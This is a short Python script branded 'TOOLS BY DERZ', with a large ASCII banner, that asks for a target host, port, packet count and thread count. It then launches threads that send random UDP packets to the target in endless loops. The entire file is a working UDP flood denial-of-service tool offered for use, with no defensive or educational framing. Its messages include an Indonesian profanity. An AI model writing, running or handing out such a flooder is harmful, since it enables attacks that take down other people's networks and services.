#Rename by Derz
#coded by Adam12
#TOOL BY DERZ
import random
import socket
import time
import threading
import getpass
import os

print("""\033[92mTOOLS BY DERZ """)
time.sleep(1)
print("""\033[91m ─────────────────────────────────────────────────────────────────────
─████████████───██████████████─████████████████───██████████████████─
─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─██▒▒████▒▒▒▒██─██▒▒██████████─██▒▒████████▒▒██───████████████▒▒▒▒██─
─██▒▒██──██▒▒██─██▒▒██─────────██▒▒██────██▒▒██───────────████▒▒████─
─██▒▒██──██▒▒██─██▒▒██████████─██▒▒████████▒▒██─────────████▒▒████───
─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒█\033[97m█───────████▒▒████─────
─██▒▒██──██▒▒██─██▒▒██████████─██▒▒██████▒▒████─────████▒▒████───────
─██▒▒██──██▒▒██─██▒▒██─────────██▒▒██──██▒▒██─────████▒▒████─────────
─██▒▒████▒▒▒▒██─██▒▒██████████─██▒▒██──██▒▒██████─██▒▒▒▒████████████─
─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─████████████───██████████████─██████──██████████─██████████████████─
─────────────────────────────────────────────────────────────────────""")

ip = str(input(" \033[91mHost/Ip:"))
port = int(input(" \033[93mPort:"))
choice = str(input(" \033[94mYakin Lu?(y/n):"))
times = int(input(" \033[92mPackets :"))
threads = int(input(" \033[96mThreads:"))

os.system("clear")

def ez():
	data = random._urandom(818)
	i = random.choice(("[2]","[1]","[3]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91mATTACK \033[94mBY DERZ")
		except:
			s.close()
			print("\033[92m EROR \033[93m KONTOL")
			
def ez2():
	data = random._urandom(1024)
	i = random.choice(("[2]","[1]","[3]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91mATTACK \033[94mBY DERZ")
		except:
			s.close()
			print("\033[92m EROR \033[93m KONTOL")
			
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = ez)
		th.start()
		
		th = threading.Thread(target = ez2)
		th.start()
else:
		th = threading.Thread(target = ez2)
		th.start()